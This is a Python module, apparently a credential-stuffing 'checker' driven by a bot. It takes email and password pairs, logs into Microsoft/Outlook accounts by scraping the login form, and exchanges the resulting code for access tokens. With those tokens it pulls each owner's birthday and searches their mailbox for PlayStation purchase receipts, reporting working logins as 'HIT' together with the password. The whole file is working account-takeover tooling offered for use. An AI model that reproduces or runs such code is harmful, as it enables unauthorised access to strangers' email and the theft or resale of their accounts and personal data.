# language: Python, file: psn.py
# Imported by bot.py. CLI disabled.

import requests
import json
import uuid
import re
import time
from datetime import datetime

MS_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
MS_REDIRECT_URI = "https://login.microsoftonline.com/common/oauth2/nativeclient"
MS_SCOPE = "https://outlook.office.com/M365.Access offline_access openid profile"

MS_AUTHORIZE_URL = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
MS_TOKEN_URL = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"


class PSNChecker:
    def __init__(self, debug=False):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.debug = debug

    def log(self, message):
        if self.debug:
            print(f"[DEBUG] {message}")

    def check(self, email, password):
        try:
            self.log(f"Checking: {email}")

            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Mobile",
                "X-Office-Version": "4.2400.0",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone64_arm64 Build/TE1A.240213.009)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
            }
            r1 = self.session.get(url1, headers=headers1, timeout=15)

            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "reason": "Not a valid Hotmail/Outlook account"}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "reason": "Not a Microsoft account"}

            time.sleep(0.3)

            auth_params = {
                "client_id": MS_CLIENT_ID,
                "response_type": "code",
                "redirect_uri": MS_REDIRECT_URI,
                "scope": MS_SCOPE,
                "login_hint": email,
                "mkt": "en",
                "client_info": "1",
                "haschrome": "1",
            }
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive",
            }
            r2 = self.session.get(MS_AUTHORIZE_URL, params=auth_params,
                                  headers=headers2, allow_redirects=True, timeout=15)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = (re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
                          or re.search(r'name="PPFT"[^>]*value="([^"]+)"', r2.text))

            if not url_match or not ppft_match:
                self.log("Could not find PPFT or urlPost")
                return {"status": "BAD", "reason": "Login page parse error"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            login_data = (
                f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1"
                f"&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
                f"&passwd={password}&ps=2"
                f"&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK="
                f"&canary=&ctx=&hpgrequestid=&PPFT={ppft}"
                f"&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0"
                f"&i21=0&CookieDisclosure=0&IsFidoSupported=0"
                f"&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            )
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url,
            }
            r3 = self.session.post(post_url, data=login_data, headers=headers3,
                                   allow_redirects=False, timeout=15)
            response_text = r3.text.lower()

            if "account or password is incorrect" in response_text:
                return {"status": "BAD", "reason": "Invalid credentials"}

            if "identity/confirm" in response_text or "consent" in response_text:
                return {"status": "2FA"}

            if "account.live.com/abuse" in response_text:
                return {"status": "BAD", "reason": "Account suspended"}

            location = r3.headers.get("Location", "")
            if not location:
                self.log("No Location header")
                return {"status": "BAD", "reason": "No redirect"}

            code_match = re.search(r'[?&#]code=([^&]+)', location)
            if not code_match:
                self.log(f"No auth code in redirect: {location[:80]}")
                return {"status": "BAD", "reason": "No auth code"}

            code = code_match.group(1)

            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                self.log("No MSPCID cookie")
                return {"status": "BAD", "reason": "No CID"}

            cid = mspcid.upper()

            token_data = {
                "client_id": MS_CLIENT_ID,
                "redirect_uri": MS_REDIRECT_URI,
                "grant_type": "authorization_code",
                "code": code,
                "scope": MS_SCOPE,
            }
            r4 = self.session.post(MS_TOKEN_URL, data=token_data,
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=15)

            if "access_token" not in r4.text:
                self.log(f"Token error: {r4.text[:200]}")
                return {"status": "BAD", "reason": "Token error"}

            token_json = r4.json()
            access_token = token_json["access_token"]

            birthday_result = self.get_birthday(email, access_token, cid)
            psn_result = self.check_psn(email, access_token, cid)

            return {
                "status": "HIT",
                "email": email,
                "password": password,
                "birthday": birthday_result.get("birthday", "Unknown"),
                "age": birthday_result.get("age", "Unknown"),
                "psn_status": psn_result.get("psn_status", "FREE"),
                "psn_orders": psn_result.get("psn_orders", 0),
                "psn_purchases": psn_result.get("purchases", []),
            }

        except requests.Timeout:
            return {"status": "BAD", "reason": "Timeout"}
        except Exception as e:
            self.log(f"Exception: {str(e)}")
            return {"status": "BAD", "reason": "Error"}

    def get_birthday(self, email, access_token, cid):
        try:
            graph_headers = {
                "User-Agent": "Outlook-Android/4.2400.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }
            profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
            try:
                r = self.session.get(profile_url, headers=graph_headers, timeout=15)
                if r.status_code == 200:
                    profile_data = r.json()
                    birthday = None
                    for key in ("birthday", "birthDate", "dateOfBirth"):
                        if key in profile_data:
                            birthday = profile_data[key]
                            break
                    if not birthday and "personalInfo" in profile_data:
                        p = profile_data["personalInfo"]
                        for key in ("birthday", "birthDate"):
                            if key in p:
                                birthday = p[key]
                                break
                    if birthday:
                        for fmt in ("%Y-%m-%d", "%m/%d/%Y", "%d/%m/%Y"):
                            try:
                                bd = datetime.strptime(birthday.split("T")[0], fmt)
                                today = datetime.now()
                                age = today.year - bd.year - ((today.month, today.day) < (bd.month, bd.day))
                                return {"birthday": bd.strftime("%Y-%m-%d"), "age": age}
                            except ValueError:
                                continue
                        return {"birthday": str(birthday), "age": "Unknown"}
            except Exception:
                pass
            return {"birthday": "Unknown", "age": "Unknown"}
        except Exception:
            return {"birthday": "Unknown", "age": "Unknown"}

    def check_psn(self, email, access_token, cid):
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                }],
            }
            headers = {
                "User-Agent": "Outlook-Android/4.2400.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Content-Type": "application/json",
            }
            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
            if r.status_code != 200:
                return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}

            data = r.json()
            purchases = []
            total_orders = 0
            try:
                rs = data["EntitySets"][0]["ResultSets"][0]
                total_orders = rs.get("Total", 0)
                for result in rs.get("Results", [])[:15]:
                    info = {}
                    body = result.get("ItemBody", {}).get("Content", "") or result.get("Preview", "")
                    for pat in (
                        r'Thank you for purchasing\s+([^\.]+?)(?:\s+from|\.|$)',
                        r'You\'ve bought\s+([^\.]+?)(?:\s+from|\.|$)',
                        r'purchased\s+([^\.]{5,60}?)\s+(?:for|from)',
                    ):
                        m = re.search(pat, body, re.IGNORECASE)
                        if m:
                            name = re.sub(r"\s+", " ", m.group(1)).strip()
                            if 5 < len(name) < 100:
                                info["item"] = name
                                break
                    for pat in (r'(?:Total|Amount|Price)[\s:]*[\$€£¥]\s*(\d+[\.,]\d{2})',
                                r'[\$€£¥]\s*(\d+[\.,]\d{2})'):
                        m = re.search(pat, body)
                        if m:
                            info["price"] = m.group(0)
                            break
                    if "ReceivedTime" in result:
                        try:
                            dt = datetime.fromisoformat(result["ReceivedTime"].replace("Z", "+00:00"))
                            info["date"] = dt.strftime("%Y-%m-%d")
                        except Exception:
                            pass
                    if info.get("item"):
                        purchases.append(info)
            except (KeyError, IndexError):
                pass

            if total_orders > 0:
                return {"psn_status": "HAS_ORDERS", "psn_orders": total_orders, "purchases": purchases}
            return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}
        except Exception:
            return {"psn_status": "ERROR", "psn_orders": 0, "purchases": []}


if __name__ == "__main__":
    # disabled — this module is imported by bot.py, CLI mode off
    print("psn.py loaded. Use bot.py to run checks.")